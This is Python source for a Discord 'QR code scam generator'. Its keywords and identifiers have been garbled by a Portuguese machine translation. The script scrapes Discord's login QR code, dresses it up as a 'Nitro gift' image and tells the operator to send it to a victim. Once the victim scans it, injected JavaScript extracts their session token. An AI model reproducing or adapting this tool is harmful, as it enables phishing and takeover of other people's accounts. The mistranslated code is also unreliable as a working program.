
de  bs4  import  BeautifulSoup
from  selenium  import  webdriver
da  imagem de importação PIL  
importar  base64
 tempo de importação
importar  os

# Desenvolvedor: NightfallGT
# Apenas para fins educacionais

def  logo_qr ():
    im1  =  Imagem . abrir ( 'temp / qr_code.png' , 'r' )
    im2  =  Imagem . abrir ( 'temp / overlay.png' , 'r' )
    im2_w , im2_h  =  im2 . Tamanho
    im1 . colar ( im2 , ( 60 , 55 ))
    im1 . salvar ( 'temp / final_qr.png' , qualidade = 95 )

def  paste_template ():
    im1  =  Imagem . abrir ( 'temp / template.png' , 'r' )
    im2  =  Imagem . abrir ( 'temp / final_qr.png' , 'r' )
    im1 . colar ( im2 , ( 120 , 409 ))
    im1 . salvar ( 'discord_gift.png' , qualidade = 95 )

def  main ():
    imprimir ( 'github.com/NightfallGT/Discord-QR-Scam \ n ' )
    imprimir ( '** QR Code Scam Generator **' )

    options  =  webdriver . ChromeOptions ()
    opções . add_experimental_option ( 'excludeSwitches' , [ 'enable-logging' ])
    opções . add_experimental_option ( 'detach' , True )
    driver  =  webdriver . Chrome ( options = options , executable_path = r'chromedriver.exe ' )

    motorista . get ( 'https://discord.com/login' )
    tempo . dormir ( 5 )
    imprimir ( '- Página carregada.' )

    page_source  =  driver . fonte da página

    sopa  =  BeautifulSoup ( page_source , features = 'lxml' )

    div  =  sopa . find ( 'div' , { 'class' : 'qrCode-wG6ZgU' })
    qr_code  =  div . find ( 'img' ) [ 'src' ]
    arquivo  =  os . caminho . juntar ( os . getcwd (), 'temp / qr_code.png' )

    img_data  =   base64 . b64decode ( qr_code . replace ( 'data: image / png; base64,' , '' ))

    com  open ( file , 'wb' ) como  manipulador :
        manipulador . escrever ( img_data )

    discord_login  =  driver . current_url
    logo_qr ()
    paste_template ()

    print ( '- QR Code foi gerado.> discord_gift.png' )
    imprimir ( 'Enviar o código QR para o usuário e digitalizar. Aguardando ..' )
    
    enquanto  verdadeiro :
        se  discord_login  ! =  driver . current_url :
            print ( 'Agarrando token ..' )
            token  =  driver . execute_script ( '' '
    var req = webpackJsonp.push ([
        [], {
            extra_id: (e, t, r) => e.exportações = r
        },
        [
            ["extra_id"]
        ]
    ]);
    para (deixe e em req.c)
        if (req.c.hasOwnProperty (e)) {
            deixe t = req.c [e] .exports;
            if (t && t .__ esModule && t.default)
                para (deixe e em t.default) "getToken" === e && (token = t.default.getToken ())
        }
    token de retorno;   
                '' ' )
            imprimir ( '---' )
            imprimir ( 'Token capturado:' , token )
            pausa

    imprimir ( 'Tarefa concluída.' )

if  __name__  ==  '__main__' :
    principal ()
